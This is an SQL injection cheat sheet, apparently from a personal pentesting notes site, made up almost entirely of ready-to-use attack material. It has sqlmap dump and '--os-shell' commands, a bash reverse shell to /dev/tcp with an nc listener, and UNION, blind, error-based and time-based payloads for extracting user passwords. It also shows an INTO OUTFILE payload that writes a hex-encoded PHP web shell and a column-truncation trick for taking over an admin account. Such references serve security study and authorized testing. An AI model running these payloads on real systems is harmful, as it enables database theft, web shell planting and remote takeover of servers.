---
title: SQL Injection
desc:
tags: [Database, Injection, SQL, Web]
alts: []
render_with_liquid: true
---

## Automation

- **Sqlmap**

    1. **Useful Usage**

        You can specify the request settings file which generated in **Burp Suite**.

        ```sh
        sqlmap -r request.txt
        sqlmap -r request.txt --dump --dbs --tables --columns --random-agent
        sqlmap -r request.txt --dump --dbms mysql --risk 3 --level 5

        # Specify dabase name, table name, column name
        sqlmap -r request.txt -D database_name -T table_name -C column_name


        # --technique=U: UNION attack
        # --delay=2: Time Delay
        sqlmap -r request.txt --technique=U --delay=2

        # --time-sec: Sleep time for Time-Based Blind SQLi
        sqlmap -r request.txt --time-sec 2
        ```

    2. **Basic Commands**

        ```sh
        # GET request
        sqlmap -u "http://<target-ip>/?search=test"
        # -p: target parameter
        sqlmap -u "http://<target-ip>/?category=test&item=1" -p item 

        # POST request
        sqlmap -u "http://<target-ip>" --data="username=test&password=test"
        ```

    3. **Web Shell**

        Add option "--os-shell" to interact with web shell.

        ```sh
        sqlmap -u "http://<target-ip>" --cookie="value=*" --os-shell
        ```

        After activating, you may want to upgrade to the full functional shell.  
        You can do that using reverse shell.

        In your local machine,

        ```sh
        nc -lvnp 4444
        ```

        Then execute the following command in web shell.

        ```sh
        os-shell> bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
        ```

## Manual Injection

1. **Comments**

    ```
    MSSQL       ->  --
    MySQL       ->  #
    Oracle      ->  --
    PostreSQL   ->  --
    ```

2. **Basic Syntax**

    ```
    ' OR 1=1--
    ' OR 1=1#
    ' UNION SELECT NULL#
    ' UNION SELECT NULL,NULL#
    ' UNION SELECT NULL,NULL,NULL#
    ' UNION SELECT 'a',NULL,NULL#
    ' UNION SELECT NULL,'a',NULL#
    ' UNION SELECT NULL,NULL,'a'#
    ' UNION SELECT username,password FROM users#
    ' UNION SELECT username || '~' || password FROM users#
    ' UNION SELECT NULL,username || '~' || password FROM users#
    ' UNION SELECT username,password FROM users WHERE username='admin' AND password='password1'#
    ' UNION SELECT username,password FROM users WHERE username='admin' OR password='password1'#
    ' UNION SELECT username,password FROM users WHERE username='admin' AND password LIKE 'pas%'#
    ```

    BINARY: Sensitive to upper case and lower case.

    ```
    ' UNION SELECT username,password FROM users WHERE username='admin' AND BINARY password='PassWord'#
    ```

    - **Version**

        - **MSSQL, MySQL**

            ```
            ' UNION SELECT @@version--
            ' UNION SELECT @@version#
            ' UNION SELECT NULL,@@version--
            ' UNION SELECT NULL,@@version#
            ```

        - **Oracle**

            ```
            ' UNION SELECT 'a' FROM dual--
            ' UNION SELECT 'a','b' FROM dual--
            ' UNION SELECT * FROM v$version--
            ' UNION SELECT BANNER,NULL FROM v$version--
            ```

        - **PostgreSQL**

            ```
            ' UNION SELECT version()--
            ```

    - **Contents**

        1. **Get Table Name**

            ```
            ' UNION SELECT table_name,NULL FROM information_schema.tables--
            ' UNION SELECT table_name,NULL FROM all_tables--
            ```

        2. **Column Name**

            ```
            ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
            ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='users_abcdef'--
            ```

        3. **Values in Column**

            ```
            ' UNION SELECT username_ghijkl,password_mnopqr FROM users_abcdef--
            ```

3. **Blind SQL**

    1. **First Check**

        ```
        ' AND '1'='1
        ' AND '1'='2
        ' AND (SELECT 'a' FROM users LIMIT 1)='a
        ```

    2. **Check if Content Value Exists**

        For example, check if username 'administrator' exists in 'users'

        ```
        ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
        ```

        If so, determine the password length

        ```
        ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
        ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
        ...
        ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=8)='a
        ```

        Brute force password's character

        ```
        ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='$a$
        ' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='$a$
        ...
        ' AND (SELECT SUBSTRING(password,8,1) FROM users WHERE username='administrator')='$a$
        ```

4. **Conditional Error**

    1. **First Check**

        ```
        '
        ''
        '||(SELECT '')||'
        '||(SELECT '' FROM dual)||'
        '||(SELECT '' FROM fake_table)||'
        '||(SELECT '' FROM users WHERE ROWNUM = 1||'
        '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
        '|| (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
        ```

    2. **Check if Content Value Exists**

        ```
        '|| (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ```

        If so, determine the password length

        ```
        ''||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ''||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ...
        ''||(SELECT CASE WHEN LENGTH(password)=8 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ```

        Brute force password character

        ```
        '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        '||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ...
        '||(SELECT CASE WHEN SUBSTR(password,8,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
        ```

5. **Time Delay**

    1. **First Check**

        ```
        ' AND sleep(5)--
        '||pg_sleep(10)--
        '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        '; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
        ```

    2. **Check if Content Value Exists**

        ```
        '; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        ```

        If so, determine the password length

        ```
        '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>2) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        ...
        '; SELECT CASE WHEN (username='administrator' AND LENGTH(password)=8) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        ```

        Brute force password character

        ```
        '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,2,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        ...
        '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,8,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
        ```

<br />

## Write Files

- Write new php file. '0x3C3F...' is hex ( <?php system($_GET["cmd"]) ?> in here )
- Access to http://10.0.0.1/shell.php?cmd=whoami

```html
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E--
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED by 0x3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E#
```

<br />

## Truncation Attack

```sh
# If the table shema is like the following...
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);


# -------------------------------------------------------

# POST request
POST /create-user HTTP/1.1
...

# Create another new "admin" with more than 64 characters. Btw, "+" means the spaces.
username=admin+++++++++++++++++++++++++++++++++++++++++++++++++++++++++random&password=password
# ---------------------------------------------------------

# Then, login with your new admin credential.
username=admin&password=password

# Or fetch the admin's information.
SELECT * FROM users WHERE username='admin';
# Return the values are the real admin's information.
username = admin
password = <REAL_ADMIN_PASSWORD>
```